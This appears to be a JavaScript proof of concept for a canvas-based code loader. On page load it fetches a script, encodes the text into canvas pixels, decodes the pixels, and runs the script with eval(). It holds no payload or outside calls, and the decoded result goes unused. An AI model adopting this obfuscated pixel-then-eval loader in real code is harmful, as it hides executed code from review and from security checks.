var canvasfer = {};
(function() {
    function getRgba(input) {
        var rgba = [];

        for(var i=0; i<input.length; i++) {
            rgba.push(input.charCodeAt(i));        
        }
        return rgba;
    }

    function drawCanvas(input) {
        createCanvas();
        var rgba = getRgba(input);
        var canvas = document.getElementById('jsCanvas');
        var ctx = canvas.getContext('2d');
        var imageData = ctx.createImageData(150,150);

        var pixels = [];
        for(var i=0, j=0; i<imageData.data.length; i+=4, j+=3) {
            imageData.data[i] = rgba[j];
            imageData.data[i+1] = rgba[j+1];
            imageData.data[i+2] = rgba[j+2];
            imageData.data[i+3] = 255;
        }

        ctx.putImageData(imageData, 0, 0);
    }

    function createCanvas() {
        var canvas = document.createElement('canvas');

        canvas.id = "jsCanvas";
        canvas.width = 150;
        canvas.height = 150;
        canvas.style.zIndex = 8;
        canvas.style.position = "absolute";
        canvas.style.border = "1px solid";

        var body = document.getElementsByTagName("body")[0];
        body.appendChild(canvas);
    }

    function getFile() {
        var uri = '/include/sitecat/sc.code.js';
        $.get(uri).then(function(text, status, xhr){
            drawCanvas(text);
            var code = deCanvasfer.deCanvas();
            canvasExer.run(text.toString());
        });
    }

    function run() {
        getFile();
    }

    canvasfer.run = run;
})();




var deCanvasfer = {};
(function() {
    function deCanvas() {
        var imageData = getCanvasData();
        var deCanvasized = '';
        for (var i=0; i<imageData.data.length; i+=4) {
            deCanvasized = deCanvasized.concat(String.fromCharCode(imageData.data[i]));
            deCanvasized = deCanvasized.concat(String.fromCharCode(imageData.data[i+1]));
            deCanvasized = deCanvasized.concat(String.fromCharCode(imageData.data[i+2]));
        }
        return deCanvasized;
    }

    function getCanvasData() {
         var canvas = document.getElementById('jsCanvas');
         var ctx = canvas.getContext('2d');
         return ctx.getImageData(0,0,150,150);
    }

    deCanvasfer.deCanvas = deCanvas;
})();



var canvasExer = {};
(function() {

    function run(input) {
        eval(input);
    }

    canvasExer.run = run;
})();



$(document).ready(function () {
   canvasfer.run(); 
});